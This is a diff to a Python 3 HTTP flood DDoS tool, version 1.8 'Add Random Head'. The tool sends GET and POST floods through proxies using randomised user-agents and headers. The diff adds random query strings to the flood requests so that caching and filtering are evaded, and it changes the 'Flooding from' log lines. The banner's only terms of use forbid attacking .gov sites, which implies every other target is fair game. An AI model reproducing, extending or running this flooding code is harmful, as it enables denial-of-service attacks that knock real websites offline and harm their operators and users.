@@ -17,12 +17,13 @@ print ('''
      CC/////  CC/////   | ddos tool |/ 
       CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 1.7 (Add Post Attack Mode)
+Python3 version 1.8 (Add Random Head)
                             C0d3d by Lee0n123
 ===============================================
        --> Use 443 Port Auto Enable SSL <--
-                      TOS:
-         Don't Attack Government Website.
+                    Tos:
+          Don't attack .gov website
+         Now here is your "random head"
 ===============================================''')
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
@@ -174,7 +175,7 @@ acceptall = [
 		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
 
 def cc():
-	get_host = "GET " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+	get_host = "GET " + url2 + "?=" + str(random.randint(0,20000)) + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 	connection = "Connection: Keep-Alive\r\n"
 	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
 	accept = random.choice(acceptall)
@@ -192,7 +193,7 @@ def cc():
 			else:
 				n = "CC"
 			s.send(str.encode(request))
-			print ("[*] "+n+" Flooding from  --> "+str(proxy[0])+":"+str(proxy[1]))
+			print ("[*] "+n+" Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for y in range(multiple):
 					s.send(str.encode(request))
@@ -209,7 +210,7 @@ def cc():
 				else:
 					n = "CC"
 				s.send(str.encode(request))
-				print ("[*] "+n+" Flooding from  --> "+str(proxy[0])+":"+str(proxy[1]))
+				print ("[*] "+n+" Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
 				try:
 					for y in range(multiple):
 						s.send(str.encode(request))
@@ -220,7 +221,7 @@ def cc():
 				s.close()
 
 def post():
-	post_host = "POST " + url2 + " HTTP/1.1\r\nHost: "+ ip + "\r\n"
+	post_host = "POST " + url2 + "?=" + str(random.randint(0,20000)) + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 	content = "Content-Type: application/x-www-form-urlencoded\r\n"
 	length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
 	refer = "Referer: http://"+ ip + url2 + "\r\n"
@@ -239,7 +240,7 @@ def post():
 			else:
 				pass
 			s.send(str.encode(request))
-			print ("[*] HTTP Post Flooding from  --> "+str(proxy[0])+":"+str(proxy[1]))
+			print ("[*] HTTP Post Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for y in range(multiple):
 					s.send(str.encode(request))
@@ -256,7 +257,7 @@ def post():
 				else:
 					pass
 				s.send(str.encode(request))
-				print ("[*] HTTP Post Flooding from  --> "+str(proxy[0])+":"+str(proxy[1]))
+				print ("[*] HTTP Post Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
 				try:
 					for y in range(multiple):
 						s.send(str.encode(request))
